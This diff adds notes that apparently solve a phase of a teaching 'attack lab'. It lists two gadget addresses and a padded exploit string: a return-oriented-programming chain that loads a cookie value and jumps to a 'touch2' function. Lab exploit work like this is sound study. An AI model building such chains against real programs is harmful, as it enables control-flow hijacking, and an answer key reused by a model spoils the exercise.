@@ -1,0 +1,15 @@
+58:
+  0x4019ab
+48 89 c7 c3 :
+  0x4019a2
+
+
+
+  cc cc cc cc cc cc cc cc cc cc
+  cc cc cc cc cc cc cc cc cc cc
+  cc cc cc cc cc cc cc cc cc cc
+  cc cc cc cc cc cc cc cc cc cc
+  ab 19 40 00 00 00 00 00  //58
+  fa 97 b9 59 00 00 00 00  //cookies
+  a2 19 40 00 00 00 00 00  //48 89 c7 c3
+  ec 17 40 00 00 00 00 00  //touch2 address
